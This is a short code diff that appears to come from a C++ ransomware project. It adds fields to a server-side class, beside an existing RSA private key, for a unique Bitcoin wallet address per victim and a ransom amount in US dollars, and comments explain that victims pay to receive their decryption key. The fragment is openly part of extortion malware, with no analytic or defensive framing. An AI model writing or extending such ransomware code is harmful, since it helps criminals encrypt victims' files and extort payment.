@@ -60,6 +60,19 @@ public:
     std::string    RSAPrivateKey;
 
     /*
+        A unique wallet address generated for a client
+        so they can send money to pay a ransom
+    */
+    std::string    UniqueBTCWalletAddress;
+
+    /*
+        The amount the client needs to pay (in usd)
+        in order to receive their public rsa 
+        decryption key
+    */
+    long           RansomAmountUSD;
+
+    /*
         Implementation for event handling- to wait
         for a new message to be sent from a client.
 
